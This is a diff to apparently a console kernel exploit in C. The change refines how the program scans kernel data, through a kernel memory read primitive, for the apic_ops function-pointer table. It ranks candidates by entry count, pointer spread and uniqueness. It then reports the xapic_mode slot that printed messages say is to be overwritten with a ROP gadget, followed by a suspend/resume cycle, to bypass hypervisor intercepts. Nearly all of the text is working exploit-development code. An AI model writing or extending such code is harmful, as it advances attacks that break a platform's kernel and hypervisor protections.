@@ -3680,10 +3680,20 @@ ring3_fallback:
                 uint64_t apic_best_addr = 0;
                 int apic_best_len = 0;
 
-                /* Track best apic_ops candidate: 26-30 entries, highest uniqueness */
+                /*
+                 * Track best apic_ops candidate using a composite score.
+                 * Real apic_ops has:
+                 *   - ~28 entries (Sony trimmed 3 from FreeBSD's 31)
+                 *   - Functions from a single .c file (local_apic.c),
+                 *     so all pointers cluster within ~8-32KB
+                 *   - Mostly unique pointers (each APIC op is distinct)
+                 *
+                 * Trampoline/stub tables: span < 1KB (32-byte spacing)
+                 * VOP tables: span > 1MB (wrappers + real funcs mixed)
+                 */
                 uint64_t apic_ops_addr = 0;
                 int apic_ops_len = 0;
-                int apic_ops_unique = 0;  /* unique pointer count */
+                int apic_ops_score = 0;  /* composite score */
 
                 /* ── Direct check at known FW 4.03 offset first ── */
                 {
@@ -3767,15 +3777,18 @@ ring3_fallback:
                             apic_found_tables++;
                             /* Dump entries for apic_ops-sized tables */
                             if (apic_run_len >= 20 && apic_run_len <= 35) {
-                                uint64_t tbl_pa = va_to_pa_quiet(apic_run_start);
-                                if (tbl_pa && tbl_pa < MAX_SAFE_PA) {
+                                uint64_t tbl_pa2 = va_to_pa_quiet(apic_run_start);
+                                if (tbl_pa2 && tbl_pa2 < MAX_SAFE_PA) {
                                     uint64_t tbl_buf[40];
                                     int cnt = apic_run_len;
                                     if (cnt > 40) cnt = 40;
-                                    kernel_copyout(g_dmap_base + tbl_pa,
+                                    kernel_copyout(g_dmap_base + tbl_pa2,
                                                    tbl_buf, cnt * 8);
                                     int uniq = 0;
+                                    uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
                                     for (int u = 0; u < cnt; u++) {
+                                        if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
+                                        if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
                                         int dup = 0;
                                         for (int v = 0; v < u; v++) {
                                             if (tbl_buf[v] == tbl_buf[u]) {
@@ -3784,13 +3797,27 @@ ring3_fallback:
                                         }
                                         if (!dup) uniq++;
                                     }
-                                    printf("      -> %d/%d unique ptrs",
-                                           uniq, cnt);
-                                    if (cnt >= 26 && cnt <= 30 &&
-                                        uniq > apic_ops_unique) {
+                                    uint64_t spread = pmax - pmin;
+                                    printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
+                                           uniq, cnt,
+                                           (unsigned long)spread,
+                                           (unsigned long)(spread >> 10));
+                                    int score = 0;
+                                    if (cnt >= 26 && cnt <= 30) {
+                                        score += 10;
+                                        if (cnt == 28) score += 5;
+                                        if (spread >= 0x400 && spread <= 0x10000)
+                                            score += 20;
+                                        else if (spread < 0x400)
+                                            score -= 10;
+                                        else
+                                            score -= 5;
+                                        score += uniq;
+                                    }
+                                    if (score > apic_ops_score) {
                                         apic_ops_addr = apic_run_start;
                                         apic_ops_len = cnt;
-                                        apic_ops_unique = uniq;
+                                        apic_ops_score = score;
                                         printf(" [BEST apic_ops candidate]");
                                     }
                                     printf("\n");
@@ -3842,9 +3869,12 @@ ring3_fallback:
                                         if (cnt > 40) cnt = 40;
                                         kernel_copyout(g_dmap_base + tbl_pa,
                                                        tbl_buf, cnt * 8);
-                                        /* Count unique pointers */
+                                        /* Count unique pointers and compute spread */
                                         int uniq = 0;
+                                        uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
                                         for (int u = 0; u < cnt; u++) {
+                                            if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
+                                            if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
                                             int dup = 0;
                                             for (int v = 0; v < u; v++) {
                                                 if (tbl_buf[v] == tbl_buf[u]) {
@@ -3853,13 +3883,34 @@ ring3_fallback:
                                             }
                                             if (!dup) uniq++;
                                         }
-                                        printf("      -> %d/%d unique ptrs",
-                                               uniq, cnt);
-                                        if (cnt >= 26 && cnt <= 30 &&
-                                            uniq > apic_ops_unique) {
+                                        uint64_t spread = pmax - pmin;
+                                        printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
+                                               uniq, cnt,
+                                               (unsigned long)spread,
+                                               (unsigned long)(spread >> 10));
+                                        /*
+                                         * Score: prefer 28 entries, 1KB-64KB spread,
+                                         * high uniqueness.
+                                         * apic_ops: ~28 entries, ~7KB spread, ~27 unique
+                                         * Trampolines: ~32B spacing → span < 1KB
+                                         * VOP tables: span > 1MB (wrapper + func mix)
+                                         */
+                                        int score = 0;
+                                        if (cnt >= 26 && cnt <= 30) {
+                                            score += 10;           /* right size range */
+                                            if (cnt == 28) score += 5;  /* exact match */
+                                            if (spread >= 0x400 && spread <= 0x10000)
+                                                score += 20;  /* 1KB-64KB = single module */
+                                            else if (spread < 0x400)
+                                                score -= 10; /* too tight = stubs */
+                                            else
+                                                score -= 5;  /* too wide = VOP */
+                                            score += uniq;  /* uniqueness bonus */
+                                        }
+                                        if (score > apic_ops_score) {
                                             apic_ops_addr = apic_run_start;
                                             apic_ops_len = cnt;
-                                            apic_ops_unique = uniq;
+                                            apic_ops_score = score;
                                             printf(" [BEST apic_ops candidate]");
                                         }
                                         printf("\n");
@@ -3895,7 +3946,10 @@ ring3_fallback:
                             kernel_copyout(g_dmap_base + tbl_pa,
                                            tbl_buf, cnt * 8);
                             int uniq = 0;
+                            uint64_t pmin = tbl_buf[0], pmax = tbl_buf[0];
                             for (int u = 0; u < cnt; u++) {
+                                if (tbl_buf[u] < pmin) pmin = tbl_buf[u];
+                                if (tbl_buf[u] > pmax) pmax = tbl_buf[u];
                                 int dup = 0;
                                 for (int v = 0; v < u; v++) {
                                     if (tbl_buf[v] == tbl_buf[u]) {
@@ -3904,12 +3958,27 @@ ring3_fallback:
                                 }
                                 if (!dup) uniq++;
                             }
-                            printf("      -> %d/%d unique ptrs", uniq, cnt);
-                            if (cnt >= 26 && cnt <= 30 &&
-                                uniq > apic_ops_unique) {
+                            uint64_t spread = pmax - pmin;
+                            printf("      -> %d/%d unique, spread=0x%lx (%luKB)",
+                                   uniq, cnt,
+                                   (unsigned long)spread,
+                                   (unsigned long)(spread >> 10));
+                            int score = 0;
+                            if (cnt >= 26 && cnt <= 30) {
+                                score += 10;
+                                if (cnt == 28) score += 5;
+                                if (spread >= 0x400 && spread <= 0x10000)
+                                    score += 20;
+                                else if (spread < 0x400)
+                                    score -= 10;
+                                else
+                                    score -= 5;
+                                score += uniq;
+                            }
+                            if (score > apic_ops_score) {
                                 apic_ops_addr = apic_run_start;
                                 apic_ops_len = cnt;
-                                apic_ops_unique = uniq;
+                                apic_ops_score = score;
                                 printf(" [BEST apic_ops candidate]");
                             }
                             printf("\n");
@@ -3933,9 +4002,9 @@ ring3_fallback:
 
                 /* Report best apic_ops candidate */
                 if (apic_ops_addr) {
-                    printf("[+] Best apic_ops candidate: kdata+0x%lx (%d entries, %d/%d unique)\n",
+                    printf("[+] Best apic_ops candidate: kdata+0x%lx (%d entries, score=%d)\n",
                            (unsigned long)(apic_ops_addr - g_kdata_base),
-                           apic_ops_len, apic_ops_unique, apic_ops_len);
+                           apic_ops_len, apic_ops_score);
                     printf("    xapic_mode slot [2] at kdata+0x%lx\n",
                            (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
                 } else {
@@ -3980,9 +4049,9 @@ ring3_fallback:
                 printf("    with ROP gadget, trigger suspend/resume cycle.\n");
                 printf("    Code runs before HV restarts → bypass intercepts.\n");
                 if (apic_ops_addr) {
-                    printf("[+] apic_ops candidate at kdata+0x%lx (%d entries, %d unique)\n",
+                    printf("[+] apic_ops candidate at kdata+0x%lx (%d entries, score=%d)\n",
                            (unsigned long)(apic_ops_addr - g_kdata_base),
-                           apic_ops_len, apic_ops_unique);
+                           apic_ops_len, apic_ops_score);
                     printf("    xapic_mode [2] at 0x%lx (kdata+0x%lx)\n",
                            (unsigned long)(apic_ops_addr + 0x10),
                            (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
